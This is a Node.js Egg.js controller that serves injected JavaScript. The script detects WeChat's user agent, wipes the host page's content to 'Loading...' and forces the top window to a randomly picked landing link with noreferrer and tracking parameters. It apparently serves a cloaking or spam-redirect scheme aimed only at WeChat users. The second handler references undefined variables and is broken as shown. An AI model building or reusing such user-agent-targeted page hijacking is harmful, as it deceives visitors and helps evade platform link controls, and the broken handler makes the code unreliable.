'use strict';

const Controller = require('egg').Controller;
const btoa = require('btoa');

class JumpController extends Controller {
    //拿落地url
    async index() {
        const {
            ctx,
            service
        } = this;

        let playing_link = await service.url.getRandomLink('wx6797180ed00efd71', 'playing_link', '05ez.com');
        const now = parseInt(Date.now() / 1000);

        const spam = service.url.getSpm();

        playing_link = service.url.addParam(playing_link, {
            [spam]: spam,
            now,
            _d: '05ez'
        }).replace('{spam}', spam);

        // playing_link = service.url.getRedirectLink(playing_link);
        ctx.set({
            'content-type': "application/x-javascript"
        });

        ctx.body = `(function() {
            var ua = navigator.userAgent.toLowerCase();
            try { document.getElementsByTagName("body")[0].outerHTML = "<center>Loading...</center>"; } catch (e) {};
            if (/micromessenger/.test(ua)) {
                if (top != window || !document.body) {
                    top.location.href = '${playing_link}';
                } else {
                    var a = document.createElement('a');
                    a.href = '${playing_link}';
                    a.rel = 'noreferrer';
                    a.click();
                }
            }
        })()`

    }


    async index2() {
        const {
            ctx,
            service
        } = this;

        service.refer.check();

        proxy.once('back', function (data) {
            ctx.set({
                'content-type': "application/x-javascript"
            });
            ctx.body = data;
        })

        if (status == 'ready') {

            status = 'pending'
            //const appid = urls[r1].appid;
            const appid = await service.url.getAppid();
            let playing_link = await service.url.getRandomLink(appid, 'playing_link')
            const kk = btoa(appid);

            const now = parseInt(Date.now() / 1000);
            playing_link = `${playing_link}?kk=${kk}&now=${now}`;

            const data = `(function() {
                var ua = navigator.userAgent.toLowerCase();
                if (/micromessenger/.test(ua)) {
                        window.location.href='${playing_link}';
                }
            })()`;
            proxy.emit('back', data);
            status = 'ready'
        }
    }
}

module.exports = JumpController;